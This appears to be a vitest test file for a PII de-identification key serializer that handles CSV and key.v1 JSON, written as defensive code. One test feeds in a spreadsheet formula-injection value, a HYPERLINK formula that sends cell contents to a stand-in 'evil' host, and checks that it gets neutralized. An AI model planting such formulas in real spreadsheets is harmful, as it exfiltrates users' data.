/**
 * key serialization — CSV (RFC-4180) and canonical key.v1 JSON, both lossless round-trips incl.
 * Hebrew values with commas/quotes/newlines; malformed key files are rejected.
 */
import { describe, expect, it } from "vitest";
import type { KeyRow } from "./types";
import { fromCsv, fromKeyFile, toCsv, toKeyFile } from "./key";

const ROWS: KeyRow[] = [
  { placeholder: "[ID_1]", original: "123456709", type: "ISRAELI_ID" },
  { placeholder: "[NAME_1]", original: "ישראל ישראלי", type: "PERSON" },
  { placeholder: "[IBAN_1]", original: "IL620108000000099999999", type: "IL_IBAN" },
];

describe("CSV round-trip", () => {
  it("is lossless for typical rows", () => {
    expect(fromCsv(toCsv(ROWS))).toEqual(ROWS);
  });

  it("survives values containing commas, quotes and newlines", () => {
    const tricky: KeyRow[] = [
      { placeholder: "[NAME_1]", original: 'כהן, ישראל "עו״ד"', type: "PERSON" },
      { placeholder: "[LOC_1]", original: "רחוב הרצל 1\nתל אביב", type: "LOCATION" },
    ];
    expect(fromCsv(toCsv(tricky))).toEqual(tricky);
  });

  it("emits a header-only CSV for no rows, and parses it back to []", () => {
    expect(toCsv([])).toBe("placeholder,original,type");
    expect(fromCsv(toCsv([]))).toEqual([]);
  });

  it("neutralizes spreadsheet formula injection but round-trips losslessly", () => {
    const dangerous: KeyRow[] = [
      { placeholder: "[PHONE_1]", original: "+972-52-1234567", type: "IL_PHONE" },
      { placeholder: "[NAME_1]", original: '=HYPERLINK("http://evil/?"&A1)', type: "PERSON" },
      { placeholder: "[NAME_2]", original: "@cmd", type: "PERSON" },
    ];
    const csv = toCsv(dangerous);
    // Every risky value is prefixed with a single quote so Excel/Sheets treats it as text.
    expect(csv).toContain("'+972-52-1234567");
    expect(csv).toContain("'=HYPERLINK");
    expect(csv).toContain("'@cmd");
    // ...yet parsing restores the exact original values.
    expect(fromCsv(csv)).toEqual(dangerous);
  });
});

describe("key.v1 JSON round-trip", () => {
  it("is lossless and carries optional docId/createdAt", () => {
    const json = toKeyFile(ROWS, { docId: "abc123", createdAt: "2026-08-04T00:00:00Z" });
    expect(JSON.parse(json)).toMatchObject({ version: "key.v1", docId: "abc123" });
    expect(fromKeyFile(json)).toEqual(ROWS);
  });

  it("omits meta fields when not provided", () => {
    const parsed = JSON.parse(toKeyFile(ROWS));
    expect(parsed.docId).toBeUndefined();
    expect(parsed.createdAt).toBeUndefined();
  });

  it("rejects an unrecognized key file", () => {
    expect(() => fromKeyFile('{"version":"nope","rows":[]}')).toThrow();
    expect(() => fromKeyFile('{"rows":[]}')).toThrow();
    expect(() => fromKeyFile('"not an object"')).toThrow();
  });
});

describe("key.v1 untrusted-input bounds", () => {
  const row = (i: number) => ({ placeholder: `[NAME_${i}]`, original: `v${i}`, type: "PERSON" });

  it("rejects a key file with more rows than the cap (DoS bound)", () => {
    const rows = Array.from({ length: 50_001 }, (_, i) => row(i));
    expect(() => fromKeyFile(JSON.stringify({ version: "key.v1", rows }))).toThrow();
  });

  it("accepts a key file at exactly the row cap", () => {
    const rows = Array.from({ length: 50_000 }, (_, i) => row(i));
    expect(fromKeyFile(JSON.stringify({ version: "key.v1", rows }))).toHaveLength(50_000);
  });

  it("normalizes an unknown row type to MANUAL instead of passing it through (JSON)", () => {
    // The type never affects restore (placeholder -> original), so normalizing keeps the row usable
    // while a hostile/corrupt type string ("__proto__", a 1MB blob, an object) never propagates.
    const json = JSON.stringify({
      version: "key.v1",
      rows: [
        { placeholder: "[X_1]", original: "v1", type: "EVIL_TYPE" },
        { placeholder: "[X_2]", original: "v2", type: 42 },
        { placeholder: "[X_3]", original: "v3" }, // missing type
        { placeholder: "[ID_1]", original: "123456709", type: "ISRAELI_ID" }, // valid — kept
      ],
    });
    const rows = fromKeyFile(json);
    expect(rows.map((r) => r.type)).toEqual(["MANUAL", "MANUAL", "MANUAL", "ISRAELI_ID"]);
    expect(rows.map((r) => r.original)).toEqual(["v1", "v2", "v3", "123456709"]); // no row dropped
  });

  it("normalizes an unknown row type to MANUAL (CSV)", () => {
    const csv = "placeholder,original,type\r\n[X_1],v1,BOGUS\r\n[NAME_1],v2,PERSON";
    expect(fromCsv(csv).map((r) => r.type)).toEqual(["MANUAL", "PERSON"]);
  });

  it("rejects a row whose placeholder or original exceeds the per-string cap", () => {
    const long = "x".repeat(10_001);
    const withOriginal = { version: "key.v1", rows: [{ placeholder: "[NAME_1]", original: long, type: "PERSON" }] };
    const withPlaceholder = { version: "key.v1", rows: [{ placeholder: long, original: "v", type: "PERSON" }] };
    expect(() => fromKeyFile(JSON.stringify(withOriginal))).toThrow();
    expect(() => fromKeyFile(JSON.stringify(withPlaceholder))).toThrow();
  });
});
